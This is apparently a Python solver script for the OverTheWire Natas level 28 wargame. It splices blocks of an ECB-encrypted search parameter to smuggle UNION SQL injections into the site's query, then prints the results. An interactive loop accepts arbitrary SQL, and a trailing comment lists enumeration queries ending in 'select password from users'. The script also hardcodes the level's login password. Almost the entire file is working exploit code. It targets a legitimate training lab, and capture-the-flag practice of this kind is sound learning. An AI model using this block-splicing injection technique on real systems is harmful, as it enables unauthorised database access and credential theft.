import requests
import base64
from urllib.parse import unquote, quote
import binascii
import re

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

# def check_session(i):
URL = "http://natas28.natas.labs.overthewire.org"
auth_username = "natas28"
auth_password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"
headers = {"authorization": 'Basic {0}'.format(base64.b64encode((auth_username + ':' + auth_password).encode('utf8')).decode())}
data = {'query':''}


# first get the fake line, for afterwards
data['query'] = '111222333'
response = requests.post(URL,data=data, headers=headers, allow_redirects=False)
param = response.headers.get('Location').split('=')[1]
# # Decode the `param`, convert to hex, and format with newlines every 16 bytes
decoded_hex = binascii.hexlify(base64.b64decode(unquote(param))).decode()
formatted_output = [decoded_hex[i:i+32] for i in range(0, len(decoded_hex), 32)]
# print('\n'.join(formatted_output) + '\n')

fake_line = formatted_output[2]

while True:
        
    # now, get almost final query
    payload = 'union all ' + input("give me sql query: ")
    data['query'] = "111222333' {};#".format(payload)

    response = requests.post(URL,data=data, headers=headers, allow_redirects=False)
    param = response.headers.get('Location').split('=')[1]

    # # Decode the `param`, convert to hex, and format with newlines every 16 bytes
    decoded_hex = binascii.hexlify(base64.b64decode(unquote(param))).decode()
    formatted_output = [decoded_hex[i:i+32] for i in range(0, len(decoded_hex), 32)]
    # insert the fake line
    formatted_output[2] = fake_line
    # print('\n'.join(formatted_output))
    # from hex to binary, from there to base64, and finally to url-encode
    encoded_hex = binascii.unhexlify(''.join(formatted_output))
    # print(encoded_hex)
    url_encoded_output = quote(base64.b64encode(encoded_hex))
    # print(url_encoded_output)
    # print(formatted_output, encoded_hex, url_encoded_output)
    response = requests.get(URL+'/search.php?query=' + url_encoded_output, headers=headers)

    print('\n'.join(re.findall(r'<li>(.*)</li>', response.text)))

# # for i in range(100):
# #     data['query'] += 'D'
# #     # cookies = {'PHPSESSID': '123'}

# #     response = requests.post(URL,data=data, headers=headers, allow_redirects=False)
# #     # Check if there's a redirect
# #     # if response.status_code in (301, 302):  # Common status codes for redirects
# #     param = response.headers.get('Location').split('=')[1]
# #     # Decode the `param`, convert to hex, and format with newlines every 16 bytes
# #     decoded_hex = binascii.hexlify(base64.b64decode(unquote(param))).decode()
# #     formatted_output = '\n'.join([decoded_hex[i:i+32] for i in range(0, len(decoded_hex), 32)])

# #     print('D x ' + str(len(data['query'])))
# #     print(formatted_output+'\n')


'''
select database()

select table_name from information_schema.tables where table_schema=0x6E617461733238

select column_name from information_schema.columns where table_name=0x7573657273

select password from users
'''